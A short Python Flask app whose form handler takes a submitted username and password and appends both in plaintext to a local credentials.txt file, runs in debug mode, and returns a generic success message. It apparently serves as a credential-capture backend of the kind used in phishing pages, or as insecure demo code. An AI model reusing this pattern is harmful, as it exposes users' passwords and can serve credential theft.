from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

    # Guardar las credenciales en un archivo
    with open("credentials.txt", "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")

    return "Form submitted successfully!"

if __name__ == '__main__':
    app.run(debug=True)